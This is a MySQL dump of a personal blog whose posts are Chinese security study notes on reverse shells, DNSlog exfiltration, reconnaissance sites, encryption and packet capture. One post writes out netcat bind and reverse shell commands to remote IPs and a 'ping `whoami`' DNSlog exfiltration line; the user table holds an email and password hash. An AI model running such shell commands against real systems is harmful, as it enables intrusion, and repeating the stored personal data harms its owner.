/*
 Navicat Premium Data Transfer

 Source Server         : 1
 Source Server Type    : MySQL
 Source Server Version : 80034 (8.0.34)
 Source Host           : localhost:3306
 Source Schema         : blog

 Target Server Type    : MySQL
 Target Server Version : 80034 (8.0.34)
 File Encoding         : 65001

 Date: 22/03/2025 19:45:14
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for blog
-- ----------------------------
DROP TABLE IF EXISTS `blog`;
CREATE TABLE `blog`  (
  `id` int NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '博客题目',
  `content` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '博客内容',
  `first_picture` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '首图',
  `flag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '标记（转载，原创）',
  `views` int NULL DEFAULT NULL COMMENT '浏览次数',
  `appreciation` tinyint NULL DEFAULT NULL COMMENT '是否赞赏',
  `share_statement` tinyint NULL DEFAULT NULL COMMENT '转载声明是否开启',
  `commentabled` tinyint NULL DEFAULT NULL COMMENT '是否允许评论',
  `published` tinyint NULL DEFAULT NULL COMMENT '是否发布（或保存草稿）',
  `recommened` tinyint NULL DEFAULT NULL COMMENT '是否推荐',
  `create_time` date NULL DEFAULT NULL COMMENT '生成时间',
  `update_time` date NULL DEFAULT NULL COMMENT '更新时间',
  `type_id` int NULL DEFAULT NULL COMMENT '类型的id',
  `user_id` int NULL DEFAULT NULL COMMENT 'user的id',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `foreign_type_id`(`type_id` ASC) USING BTREE,
  INDEX `foreign_user_id`(`user_id` ASC) USING BTREE,
  CONSTRAINT `foreign_type_id` FOREIGN KEY (`type_id`) REFERENCES `type` (`id`) ON DELETE SET NULL ON UPDATE CASCADE,
  CONSTRAINT `foreign_user_id` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
) ENGINE = InnoDB AUTO_INCREMENT = 27 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of blog
-- ----------------------------
INSERT INTO `blog` VALUES (22, '反弹shell+dnslog', '### 文件下载命令生成：\r\n\r\nhttps://forum.ywhack.com/bountytips.php?download\r\n\r\n\r\n\r\n### 反弹shell\r\n\r\n命令生成：https://forum.ywhack.com/shell.php\r\n\r\n为什么需要反弹shell\r\n\r\n**解决数据回显**\r\n\r\n![image-20250317162112019](/uploads/327ec1da-363a-4b22-9a8f-a5a5b3b0575a.png)\r\n\r\n比如一个漏洞像这种，输入一个命令之后，需要你继续输入东西的，我们如果没有对方的界面，就无法继续输入东西。所以需要反弹shell获取到对方的界面\r\n\r\n**解决数据通讯**\r\n\r\n如果在网页上已知提交，提交一条就会有一条记录，但如果反弹shell之后就只有一条记录，后面都是本地的\r\n\r\n\r\n\r\n#### 正向连接（本地监听等对方连接）\r\n\r\n**Linux控制Windows**\r\n\r\nnc在linux是自带的，在windows需要下载\r\n\r\n\r\n\r\n在windows中：将cmd绑定到本地的5566端口（端口随机）：\r\n\r\n`nc -e cmd -lvp 5566`\r\n\r\n在linux中：主动连接目标的5566\r\n\r\n`ncat 47.122.23.131 5566`\r\n\r\n\r\n\r\n**windows控制linux**\r\n\r\n在Linux中：绑定sh到本地5566端口\r\n\r\n`ncat -e /bin/sh -lvp 5566`\r\n\r\n在windows中：主动连接目标的5566\r\n\r\n`nc 47.94.236.117 5566`\r\n\r\n\r\n\r\n#### 反向连接（主动给出到对方监听的端口）\r\n\r\n 例如：\r\n\r\nwindows监听本地的5566：\r\n\r\n`nc -lvp 5566`\r\n\r\nlinux绑定自己的sh，给到对方的5566端口：\r\n\r\n`ncat -e /bin/sh 121.62.16.96 5566`\r\n\r\n\r\n\r\n要控制内网一台机器的权限，只能通过反向连接，因为你不知道内网机器的IP\r\n\r\n\r\n\r\n**场景：**漏洞有，但是**数据不回显**——反弹shell\r\n\r\n什么是dnslog\r\n\r\n打开dnslog平台可以看到自己的地址 4o7zc8.dnslog.cn\r\n\r\n通过linux服务器 ping 4o7zc8.dnslog.cn 可以看到记录：\r\n\r\n![image-20250317194816121](/uploads/6257e826-3c33-4d34-b306-3b9a336d51de.png)\r\n\r\nlinux服务器输入命令：\r\n\r\n```\r\nping `whoami`.4o7zc8.dnslog.cn\r\n```\r\n\r\n结果：\r\n\r\n![1742212215565](C:Users86151DocumentsWeChat Fileswxid_ectne75nfs1922FileStorageTemp1742212215565.jpg)\r\n\r\n```\r\n但是windows主机并不支持``，\r\n\r\ncmd无法执行whoami，因为前面有个ping，要ping `whoami` 才能执行到whoami，但是windows主机的话不支持``，所以需要用到powershell变量赋值把whoami的执行结果给变量。因为执行结果中带有“\\“导致ping无法执行，所以把\\换掉\r\n\r\n\r\n```\r\n\r\n\r\n\r\n![image-20250317195133001](/uploads/84d71897-ea90-4de1-81f0-d5b11a49bf16.png)\r\n\r\n\r\n\r\n![image-20250317195801378](/uploads/cbdd1910-269e-4d2a-9cfc-fa9e117baf06.png)\r\n\r\n\r\n\r\n', '', '原创', 0, 1, 0, 1, 1, 1, '2025-03-21', '2025-03-21', 32, 1);
INSERT INTO `blog` VALUES (23, '网络安全基础知识', '\r\n\r\n### 子域名模式：\r\n\r\nwww.yaowenda.com blog java程序\r\n\r\nywd.yaowenda.com wordpress php程序\r\n\r\nbbs.yaowenda.com 论坛 dz程序\r\n\r\noa.yaowenda.com OA 通达OA\r\n\r\n\r\n\r\n### 端口模式：\r\n\r\nwww.yaowenda.com:88 blog java程序\r\n\r\nwww.yaowenda.com:8080 wordpress php程序\r\n\r\n\r\n\r\n### 目录模式（一个文件夹下在不同的目录放了两套源码）：\r\n\r\nhttp://www.yaowenda.com/ blog java程序\r\n\r\nhttp://www.yaowenda.com/bbs wordpress php程序\r\n\r\n\r\n\r\n### 路由访问：\r\n\r\n​	常规：URL和文件目录对应上\r\n\r\n​	路由访问：MVC、java、python   URL和文件目录对应不上，要根据配置路由决定\r\n\r\n\r\n\r\n### 前后端分离：\r\n\r\n​	1、前端页面大部分不存在漏洞\r\n\r\n​	2、后端管理大部分不在同域名\r\n\r\n​	3、获得权限有可能不影响后端\r\n\r\n\r\n\r\n### 不同的集成化环境：\r\n\r\n​	上传并连接后门之后\r\n\r\n​	宝塔：不能访问上级目录，不能执行命令\r\n\r\n​	phpstudy：能执行命令\r\n\r\n​	传统（IIS）：可\r\n\r\n \r\n\r\n### Docker：\r\n\r\n​	攻击者拿下权限之后，并非真实物理环境，而是虚拟空间磁盘\r\n\r\n\r\n\r\n### CDN\r\n\r\n内容分发网络，目的是加速网络传输，提高用户的访问速度。\r\n\r\n主要重点是缓存静态资源，一些现代 CDN 提供边缘计算功能，允许在 CDN 边缘服务器上运行代码，使得能够处理动态请求。（数据库内容通常不缓存）\r\n\r\n**影响：** 隐藏了真实的IP地址，导致信息搜集目标错误。\r\n\r\n\r\n\r\n### OSS\r\n\r\n文件资源单独存储，不解析文件，文件上传漏洞不存在\r\n\r\nAccessKey泄露问题带来安全隐患\r\n\r\n\r\n\r\n### 反向代理\r\n\r\n访问的只是一个代理，而非真实应用服务器\r\n\r\n\r\n\r\n### 负载均衡\r\n\r\n通过将网络流量均匀地分配到多个服务器上，防止单个服务器过载，确保应用程序的高可用性和响应速度。\r\n\r\n**影响：** 有多个服务器加载服务，测试过程中存在多个目标\r\n\r\n\r\n\r\n### APP - 开发架构 - 原生态开发\r\n\r\n反编译：提取源码，提取源码中资产 && 抓包 && 提取资产进行常规测试\r\n\r\n\r\n\r\n### APP - 开发架构 - WEB封装\r\n\r\n常规web安全测试\r\n\r\n\r\n\r\n### APP - 开发架构 - H5&&Vue\r\n\r\nAPI测试、 JS框架安全、 JS前端测试\r\n\r\n\r\n\r\n', '', '原创', 0, 1, 0, 1, 1, 1, '2025-03-21', '2025-03-21', 32, 1);
INSERT INTO `blog` VALUES (24, '加密与编码', 'Captfencoder是一款开源的快速跨平台网络安全工具套件，提供网络安全相关的代码转换、经典密码、密码学、非对称加密等杂项工具，并聚合各类在线工具。\r\n\r\n\r\n\r\n有源码直接分析源码分析算法\r\n\r\n没有源码：\r\n\r\n​	1、猜 识别\r\n\r\n​	2、看前端JS（如果加密逻辑在前端）\r\n\r\n![image-20250319153135023](/uploads/3d79a821-10b5-47fc-8cbd-a9f1a5cdaeb0.png)\r\n\r\n\r\n\r\n### BASE64编码特点\r\n\r\n大小写 = 等号结尾 明文越长秘文越长，密文一般不会有/\r\n\r\n\r\n\r\n### 单向散列加密（代表：MD5）\r\n\r\n常见的单向散列加密：MD5、SHA、MAC、CRC\r\n\r\n缺点是存在暴力破解的可能，最好通过加盐提高安全性，此外存在散列冲突，例如MD5能被破解（碰撞解密）\r\n\r\n**md5 固定16位或者32位 英文和数字**\r\n\r\n \r\n\r\n### 对称加密 \r\n\r\nAES DES RC4\r\n\r\n发送方和接受方必须商定好秘钥，然后双方保管好\r\n\r\nAES DES密文特点和base64基本类似，**但是会出现/ + 在密文里面**\r\n\r\n解密需求：密文 模式 加密key 偏移量 要都知道 **最关键是知道key 偏移量**\r\n\r\n \r\n\r\n### 非对称加密\r\n\r\nRSA RSA2 PKCS\r\n\r\n相比于对称加密，安全性更好，加密和解密需要不同的秘钥，公钥和私钥都可以相互加解密\r\n\r\n缺点是解密和解密时间长、速度慢、只适合对少量数据进行加密\r\n\r\n解密需求：1、密文，2、公钥和私钥有其中一个\r\n\r\n若用公钥加密则需要用私钥解密，若用私钥加密则需要公钥解密，因为不知道加密用的是公钥还是私钥，所以最好公钥和私钥都知道\r\n\r\n\r\n\r\n### 什么是加盐\r\n\r\n明文：123456\r\n\r\nsalt：3946d5\r\n\r\n\r\n\r\nmd5(123456) = e10adc3949ba59abbe56e057f20f883e\r\n\r\n加盐就是把salt加在后面：e10adc3949ba59abbe56e057f20f883e3946d5\r\n\r\n\r\n\r\n若$password = md5(md5($password).$salt) 那就是再md5一次 ： d7192407bb4bfc83d28f374b6812fbcd\r\n\r\n', '', '原创', 0, 1, 0, 1, 1, 1, '2025-03-21', '2025-03-21', 32, 1);
INSERT INTO `blog` VALUES (25, '信息搜集', '| 标签       | 名称         | 地址                                 |\r\n| ---------- | ------------ | ------------------------------------ |\r\n| 企业信息   | 天眼查       | https://www.tianyancha.com/          |\r\n| 企业信息   | 小蓝本       | https://www.xiaolanben.com/          |\r\n| 企业信息   | 爱企查       | https://aiqicha.baidu.com/           |\r\n| 企业信息   | 企查查       | https://www.qcc.com/                 |\r\n| 企业信息   | 国外企查     | https://opencorporates.com/          |\r\n| 企业信息   | 启信宝       | https://www.qixin.com/               |\r\n| 备案信息   | 备案信息查询 | http://www.beianx.cn/                |\r\n| 备案信息   | 备案管理系统 | https://beian.miit.gov.cn/           |\r\n| 公众号信息 | 搜狗微信搜索 | https://weixin.sogou.com/            |\r\n| 注册域名   | 域名注册查询 | https://buy.cloud.tencent.com/domain |\r\n| IP 反查    | IP 反查域名  | https://x.threatbook.cn/             |\r\n| IP 反查    | IP 反查域名  | http://dns.bugscaner.com/            |\r\n|            |              |                                      |\r\n\r\n| 标签     | 名称                   | 地址                                       |\r\n| -------- | ---------------------- | ------------------------------------------ |\r\n| DNS 数据 | dnsdumpster            | https://dnsdumpster.com/                   |\r\n| 证书查询 | CertificateSearch      | https://crt.sh/                            |\r\n| 网络空间 | FOFA                   | https://fofa.info/                         |\r\n| 网络空间 | 鹰图                   | http://hunter.qianxin.com/                 |\r\n| 网络空间 | 360                    | https://quake.360.cn/quake/                |\r\n| 威胁情报 | 微步在线 情报社区      | https://x.threatbook.cn/                   |\r\n| 威胁情报 | 奇安信 威胁情报中心    | https://ti.qianxin.com/                    |\r\n| 威胁情报 | 360 威胁情报中心       | https://ti.360.cn/#/homepage               |\r\n| 枚举解析 | 在线子域名查询         | http://tools.bugscaner.com/subdomain/      |\r\n| 枚举解析 | DNSGrep 子域名查询     | https://www.dnsgrep.cn/subdomain           |\r\n| 枚举解析 | 工具强大的子域名收集器 | https://github.com/shmilylty/OneForAll     |\r\n| 指纹识别 | 指纹识别               | http://whatweb.bugscaner.com/look/         |\r\n| 指纹识别 | Wappalyzer（插件）     | https://github.com/AliasIO/wappalyzer      |\r\n| 指纹识别 | **TideFinger 潮汐**    | http://finger.tidesec.net/                 |\r\n| 指纹识别 | **云悉指纹**           | https://www.yunsee.cn/                     |\r\n| 指纹识别 | WhatWeb                | https://github.com/urbanadventurer/WhatWeb |\r\n| 指纹识别 | 数字观星 Finger-P      | https://fp.shuziguanxing.com/#/            |\r\n|          |                        |                                            |\r\n|          |                        |                                            |\r\n\r\n| 标签     | 名称                    | 地址                                  |\r\n| -------- | ----------------------- | ------------------------------------- |\r\n| 网络空间 | 钟馗之眼                | https://www.zoomeye.org/              |\r\n| 网络空间 | 零零信安                | https://0.zone/                       |\r\n| 网络空间 | Shodan                  | https://www.shodan.io/                |\r\n| 网络空间 | Censys                  | https://censys.io/                    |\r\n| 网络空间 | ONYPHE                  | https://www.onyphe.io/                |\r\n| 网络空间 | FullHunt                | https://fullhunt.io/                  |\r\n| 网络空间 | Soall Search Engine     | https://soall.org/                    |\r\n| 网络空间 | Netlas                  | https://app.netlas.io/responses/      |\r\n| 网络空间 | Leakix                  | https://leakix.net/                   |\r\n| 网络空间 | DorkSearch              | https://dorksearch.com/               |\r\n| 威胁情报 | VirusTotal 在线查杀平台 | https://www.virustotal.com/gui/       |\r\n| 威胁情报 | VenusEye 威胁情报中心   | https://www.venuseye.com.cn/          |\r\n| 威胁情报 | 绿盟科技 威胁情报云     | https://ti.nsfocus.com/               |\r\n| 威胁情报 | IBM 情报中心            | https://exchange.xforce.ibmcloud.com/ |\r\n| 威胁情报 | 天际友盟安全智能平台    | https://redqueen.tj-un.com            |\r\n| 威胁情报 | 华为安全中心平台        | https://isecurity.huawei.com/sec      |\r\n| 威胁情报 | 安恒威胁情报中心        | https://ti.dbappsecurity.com.cn/      |\r\n| 威胁情报 | AlienVault              | https://otx.alienvault.com/           |\r\n| 威胁情报 | 深信服                  | https://sec.sangfor.com.cn/           |\r\n| 威胁情报 | 丁爸情报分析师的工具箱  | http://dingba.top/                    |\r\n| 威胁情报 | 听风者情报源 start.me   | https://start.me/p/X20Apn             |\r\n| 威胁情报 | GreyNoise Visualizer    | https://viz.greynoise.io/             |\r\n| 威胁情报 | URLhaus 数据库          | https://urlhaus.abuse.ch/browse/      |\r\n| 威胁情报 | Pithus                  | https://beta.pithus.org/              |\r\n|          |                         |                                       |\r\n\r\n\r\n\r\nOneForAll  https://github.com/shmilylty/OneForAll\r\n\r\nOneForAll在默认参数正常执行完毕会在results目录生成相应结果\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '', '原创', 0, 1, 0, 1, 1, 1, '2025-03-21', '2025-03-21', 32, 1);
INSERT INTO `blog` VALUES (26, '抓包', '科来\r\n\r\n​	应用分类筛选\r\n\r\n​	应用进程筛选\r\n\r\n​	网络接口IP筛选\r\n\r\nWireshark\r\n\r\n​	只能通过语法筛选\r\n\r\n封包监听工具\r\n\r\n\r\n\r\nfiddler\r\n\r\nBurpsuite\r\n\r\n茶杯 \r\n\r\nProxifier\r\n\r\n\r\n\r\n403 说明文件夹存在\r\n\r\n\r\n\r\n', '', '原创', 0, 1, 0, 1, 1, 1, '2025-03-21', '2025-03-21', 32, 1);

-- ----------------------------
-- Table structure for blog_tag
-- ----------------------------
DROP TABLE IF EXISTS `blog_tag`;
CREATE TABLE `blog_tag`  (
  `id` int NOT NULL AUTO_INCREMENT COMMENT 'id',
  `blog_id` int NULL DEFAULT NULL COMMENT '博客的id',
  `tag_id` int NULL DEFAULT NULL COMMENT 'tag的id',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `foreign_blog_id`(`blog_id` ASC) USING BTREE,
  INDEX `foreign_tag_id`(`tag_id` ASC) USING BTREE,
  CONSTRAINT `foreign_blog_id` FOREIGN KEY (`blog_id`) REFERENCES `blog` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `foreign_tag_id` FOREIGN KEY (`tag_id`) REFERENCES `tag` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of blog_tag
-- ----------------------------

-- ----------------------------
-- Table structure for comment
-- ----------------------------
DROP TABLE IF EXISTS `comment`;
CREATE TABLE `comment`  (
  `id` int NOT NULL AUTO_INCREMENT COMMENT '评论的id',
  `nickname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '昵称',
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '评论者邮箱',
  `content` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '评论内容',
  `avatar` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '头像',
  `create_time` datetime NULL DEFAULT NULL COMMENT '创建时间',
  `blog_id` int NULL DEFAULT NULL COMMENT '所评论的博客的id',
  `father_comment_id` int NULL DEFAULT NULL COMMENT '父评论的id',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `comment_foreign_blog_id`(`blog_id` ASC) USING BTREE,
  INDEX `foreign_father_comment_id`(`father_comment_id` ASC) USING BTREE,
  CONSTRAINT `comment_foreign_blog_id` FOREIGN KEY (`blog_id`) REFERENCES `blog` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `foreign_father_comment_id` FOREIGN KEY (`father_comment_id`) REFERENCES `comment` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of comment
-- ----------------------------

-- ----------------------------
-- Table structure for tag
-- ----------------------------
DROP TABLE IF EXISTS `tag`;
CREATE TABLE `tag`  (
  `id` int NOT NULL AUTO_INCREMENT COMMENT '标签的ID',
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '标签的名字',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of tag
-- ----------------------------

-- ----------------------------
-- Table structure for type
-- ----------------------------
DROP TABLE IF EXISTS `type`;
CREATE TABLE `type`  (
  `id` int NOT NULL AUTO_INCREMENT COMMENT '分类的ID',
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '分类的名字',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 36 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of type
-- ----------------------------
INSERT INTO `type` VALUES (30, '开发');
INSERT INTO `type` VALUES (31, '爬虫');
INSERT INTO `type` VALUES (32, '网络安全');
INSERT INTO `type` VALUES (33, 'deepfake检测');
INSERT INTO `type` VALUES (34, 'ruoyi-vue+flowable');
INSERT INTO `type` VALUES (35, 'java考试笔记');

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user`  (
  `id` int NOT NULL AUTO_INCREMENT COMMENT '用户id',
  `nickname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '昵称',
  `username` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '用户名',
  `password` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '密码',
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '邮箱',
  `avatar` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '头像',
  `type` int NULL DEFAULT NULL COMMENT '类型',
  `create_time` datetime NULL DEFAULT NULL COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES (1, 'yaowenda', 'yaowenda', '96e79218965eb72c92a549dd5a330112', '1046748784@qq.com', NULL, 1, NULL, NULL);

SET FOREIGN_KEY_CHECKS = 1;
